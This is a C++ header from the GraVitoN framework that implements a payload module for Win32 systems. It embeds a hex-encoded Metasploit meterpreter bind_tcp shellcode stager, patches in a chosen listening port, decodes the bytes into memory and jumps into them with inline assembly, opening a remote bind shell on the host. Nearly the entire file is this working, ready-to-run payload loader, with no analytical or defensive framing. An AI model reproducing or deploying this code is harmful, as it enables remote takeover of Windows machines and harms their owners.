/**
 * @file
 * @author  Sina Hatef Matbue ( _null_ ) <sinahatef.cpp@gmail.com>
 *
 * @section License
 *
 * This file is part of GraVitoN.
 *
 * Graviton is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Graviton is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Graviton.  If not, see http://www.gnu.org/licenses/.
 *
 * @brief Payload_Meter_W32b
 *
*/

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
#ifndef _GVN_PAYLOAD_METER_W32B_HEAD_
#define _GVN_PAYLOAD_METER_W32B_HEAD_

#include "../gvn_payload.hpp"

#include <cstdio>
#include <cstdlib>

using namespace GraVitoN;

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
/**
 * @brief Meterpreter Encoded Bind Shell For Win32
 *
 * @see Payload_Sample
 *
 */
class Payload_Meter_W32b : public GraVitoN::Bin_Payload
{
protected:
	virtual bool initPayload();
	bool decode();
	
public:
    Payload_Meter_W32b();
    virtual ~Payload_Meter_W32b();

    virtual bool initialize ( const string &_options );
    virtual bool run();
};

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
Payload_Meter_W32b::Payload_Meter_W32b()
{
    jumper = _null_;
}

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
Payload_Meter_W32b::~Payload_Meter_W32b()
{
}


//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
bool Payload_Meter_W32b::decode()
{
	//Logger::logItLn(payload);
	
    int enc_size = payload_size;
    payload_size = 0;

    for ( int i=0; i<enc_size; i+=2 ) {
        unsigned char a[2] = {tolower ( payload[i] ), tolower ( payload[i+1] ) };
        unsigned char x = '\0';

        if ( a[0] >= 97 ) {
            a[0] = ( ( unsigned int ) a[0] - 87 );
        } else if ( a[0] <= 57 ) {
            a[0] = ( ( unsigned int ) a[0] - 48 );
        }

        if ( a[1] >= 97 ) {
            a[1] = a[1] - 87;
        } else if ( a[1] <= 57 ) {
            a[1] = a[1] - 48;
        }

        x = ( unsigned int ) a[0] * 16 + ( unsigned int ) a[1];

        //printf("%c%c -> %.2x\n", payload[i], payload[i+1], x);
        payload[ payload_size++ ] = x;
    }

    return true;
}

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
bool Payload_Meter_W32b::initPayload()
{
	string hex_port = "1cbd"; // port=7357
	
    /**
     * windows/meterpreter/bind_tcp - 298 bytes (stage 1) \n
     * http://www.metasploit.com \n
     * VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process, \n
     * AutoLoadStdapi=true, InitialAutoRunScript=, AutoRunScript=, \n
     * AutoSystemInfo=true, EnableUnicodeEncoding=true \n
     */
    unsigned char buf[] =
		"fce8890000006089e531d2648b5230"
        "8b520c8b52148b72280fb74a2631ff"
        "31c0ac3c617c022c20c1cf0d01c7e2"
        "f052578b52108b423c01d08b407885"
        "c0744a01d0508b48188b582001d3e3"
        "3c498b348b01d631ff31c0acc1cf0d"
        "01c738e075f4037df83b7d2475e258"
        "8b582401d3668b0c4b8b581c01d38b"
		"048b01d0894424245b5b61595a51ff"
        "e0585f5a8b12eb865d683332000068"
		"7773325f54684c772607ffd5b89001"
        "000029c454506829806b00ffd55050"
        "50504050405068ea0fdfe0ffd59731"
        "db53680200115c89e66a10565768c2"
        "db3767ffd5535768b7e938ffffd553"
        "53576874ec3be1ffd5579768756e4d"
        "61ffd56a006a0456576802d9c85fff"
        "d58b366a406800100000566a006858"
        "a453e5ffd593536a005653576802d9"
        "c85fffd501c329c685f675ecc3"
		;
		
    int buf_len = 298*2;
	
	if( !OptParser::getValueAsHexString(options, "PORT", hex_port) )
		hex_port = "1cbd"; // 7357
	
	int pos = 13*30 + 10;
	while( hex_port.length() < 4 )
		hex_port = "0" + hex_port;

	for(int i=0; i<4; ++i)
		buf[pos+i] = hex_port[i];

    payload_size = buf_len;
    payload = new unsigned char[payload_size];
    memcpy ( payload, buf, payload_size * sizeof ( unsigned char ) );

    return true;
}

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
bool Payload_Meter_W32b::initialize ( const string &_options )
{
    options = _options;

	/// Init memory
    Logger::logIt ( "init payload... " );
    initPayload();
    Logger::logItLn ( "done" );

	/// Decode
	Logger::logIt ( "decoding..." );
    decode();
    Logger::logItLn ( "done" );

	/// Set jumper address
    jumper = ( void ( * ) ( void* ) ) malloc ( payload_size );
    memcpy ( ( void* ) jumper, ( void * ) payload, payload_size * sizeof ( unsigned char ) );

    return true;
}

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
bool Payload_Meter_W32b::run()
{
    // A Little Delay!
    int _delay = 222;
    while ( _delay > 0 ) {
        --_delay;
    }

    int useless_out = 0;
    Logger::logItLn ( "Jumping..." );
    asm (
        "mov %1, %%ebx;"
        "jmp *%%ebx;"
        : "=r" ( useless_out )
        : "r" ( jumper )
        : "%ebx"
    );
    Logger::logItLn ( "call > done" );

    return true;
}

#endif // _GVN_PAYLOAD_METER_W32B_HEAD_
